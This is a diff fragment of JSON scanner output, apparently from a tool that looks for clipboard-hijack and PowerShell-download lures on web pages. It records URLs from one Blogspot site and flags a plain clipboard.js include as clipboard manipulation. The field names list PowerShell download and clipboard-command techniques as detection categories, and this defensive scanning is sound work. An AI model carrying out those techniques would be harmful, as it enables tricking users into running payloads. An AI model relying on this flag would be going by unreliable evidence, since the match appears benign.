+        "https://staplebrokenmetaliyro.blogspot.com/search",
+        "https://staplebrokenmetaliyro.blogspot.com/",
+        "https://staplebrokenmetaliyro.blogspot.com/favicon.ico",
+        "https://www.blogger.com",
+        "https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default\\x22",
+        "https://staplebrokenmetaliyro.blogspot.com/feeds/posts/default?alt\\x3drss\\x22",
+        "https://www.blogger.com/feeds/3967763303726818370/posts/default\\x22",
+        "https://www.blogger.com/profile/02686294779557843862\\x22",
+        "https://apis.google.com/js/platform.js",
+        "https://staplebrokenmetaliyro.blogspot.com/",
+        "https://www.blogger.com/static/v1/jsbin/709570948-lbx.js",
+        "https://www.blogger.com/static/v1/v-css/3681588378-lightbox_bundle.css"
+      ],
+      "PowerShellCommands": null,
+      "IpAddresses": null,
+      "ClipboardCommands": null,
+      "SuspiciousKeywords": null,
+      "ClipboardManipulation": "...ync' src='https://www.gstatic.com/external_hosted/clipboardjs/clipboard.min.js'></script> <meta name='google-adsense-platform-account' content='ca-hos...",
+      "PowerShellDownloads": null
+    }
+  ]
+}
